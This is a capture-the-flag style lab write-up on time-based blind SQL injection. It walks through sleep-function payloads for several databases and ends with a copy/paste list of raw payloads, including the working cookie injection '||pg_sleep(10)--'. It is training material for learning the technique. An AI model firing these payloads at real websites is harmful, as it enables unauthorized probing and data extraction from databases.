# Blind SQL injection with time delays

*A clean, step‚Äëby‚Äëstep write‚Äëup using my original flow and raw payloads (no URL‚Äëencoding), with tiny typo fixes and minimal notes.*

## ‚úÖ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** Cause the website to load for 10 seconds.
2. We already know we‚Äôll use some kind of **SLEEP** function depending on the DB, so let‚Äôs find the DB version.
3. First we‚Äôll find the **vulnerable parameter**.
4. Going over all the parameters I could find, I realized this might be a **blind SQLi**, which means we‚Äôll have to blindly input injections like monkeys.
5. Function guesses: in **Oracle**: `DBMS_SESSION.SLEEP` (also common: `DBMS_LOCK.SLEEP`), in **PostgreSQL**: `pg_sleep`, in **SQL Server**: `WAITFOR DELAY`, in **MySQL**: `SLEEP`. We can make really extensive queries.
6. **Payloads I used:**  
   `'+AND+DBMS_SESSION.SLEEP(1)--`,  
   `'+AND+pg_sleep(1)--`,  
   `'+AND+sleep(1)--`,  
   `'+AND+WAITFOR DELAY+'0:0:1'--`,  
   `'+AND+111111111111.....--`
7. None of them worked. I thought maybe **AND** isn‚Äôt getting recognized at all (ignored by the sink)?
8. Then I tried **string concatenation** on all payloads:  
   `'+||+DBMS_SESSION.SLEEP(1)--` (and friends).
9. `'+||+pg_sleep(1)--` **worked in the cookie** ‚Üí  
   `TrackingId=lRSj0fa9nvhrCat0'+||+pg_sleep(1)--`
10. Let‚Äôs increase to **10 seconds**:  
    `'+||+pg_sleep(10)--`
11. **Lab solved!** ‚úÖ

## üß† Why This Works (minimal notes)
- The vulnerable sink concatenates your cookie into a **string expression**. Adding `AND` didn‚Äôt affect the surrounding SQL (likely still inside a quoted string), so the boolean clause was ignored.  
- Using the string **concatenation operator** `||` with a function call forces the database to **evaluate the function** (side effect = **delay**), even if the final value isn‚Äôt used.  
- DB sleep primitives recap:  
  - **PostgreSQL**: `pg_sleep(seconds)`  
  - **Oracle**: `DBMS_LOCK.SLEEP(seconds)` (and sometimes `DBMS_SESSION.SLEEP(seconds)`)  
  - **SQL Server**: `WAITFOR DELAY '00:00:10'`  
  - **MySQL**: `SLEEP(10)`

> If concatenation fails on some engines, try `...'||(SELECT pg_sleep(10))||'` or `...'; SELECT pg_sleep(10);--` depending on how the input is embedded.

## ‚å®Ô∏è Raw Payloads (copy/paste ‚Äî exactly as used)
```text
'+AND+DBMS_SESSION.SLEEP(1)--
'+AND+pg_sleep(1)--
'+AND+sleep(1)--
'+AND+WAITFOR DELAY+'0:0:1'--
'+AND+111111111111.....--
'+||+DBMS_SESSION.SLEEP(1)--
'+||+pg_sleep(1)--
TrackingId=lRSj0fa9nvhrCat0'+||+pg_sleep(1)--
'+||+pg_sleep(10)--
```

## üèÅ Result
- Time‚Äëbased oracle established through cookie concatenation with `pg_sleep`. Delayed the response by **10 seconds**. **Solved. ‚úÖ**
